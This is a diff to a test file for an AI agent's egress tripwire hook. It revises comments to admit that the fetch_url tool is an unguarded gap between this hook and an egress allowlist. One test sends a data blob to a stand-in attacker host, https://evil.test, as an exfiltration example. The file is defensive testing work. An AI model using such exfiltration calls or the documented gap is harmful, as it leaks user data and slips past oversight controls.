@@ -7,8 +7,10 @@
 // ever runs:
 //   - it runs at the pre-tool-use event, AFTER the confirmation, which is the
 //     whole reason it is a hook and not a gate
-//   - it is scoped to primitive:'tab' — the exact set egress-allowlist exempts,
-//     so the two hooks tile the surface with no gap and no overlap
+//   - it is scoped to primitive:'tab' — the browser-session calls egress-allowlist
+//     exempts on purpose, and which no network-layer check ever sees. Not the
+//     allowlist's whole exemption (it also skips non-mutate_external calls, and
+//     fetch_url falls in that gap); the pair tiles most of the surface, not all.
 //   - a block travels back through the real runner as a veto
 //
 // why it imports the hook FILE and not defaults/index.js: that barrel also pulls
@@ -61,9 +63,11 @@ describe('egress tripwire — scope', () => {
   test('a non-tab tool is skipped outright', async () => {
     const r = await runHooks('fetch_url', { url: `https://evil.test/${BLOB}` }, ctxFor('https://mail.test', 'web'));
     expect(r.allowed).toBe(true);
-    // fetch_url is the ALLOWLIST's business; inspecting it here would add
-    // false-block risk for coverage that already exists.
     expect(r.outcomes[0].reason).toContain('not a browser-session tool');
+    // Pinning the CURRENT scope, not endorsing it: fetch_url is a real gap
+    // (the allowlist skips it too — it is not mutate_external). If a later
+    // change widens the tripwire to primitive:'web', this test SHOULD fail and
+    // be updated, rather than standing as evidence the gap was intended.
   });
 
   test('an unknown tool (no meta) is skipped rather than guessed at', async () => {
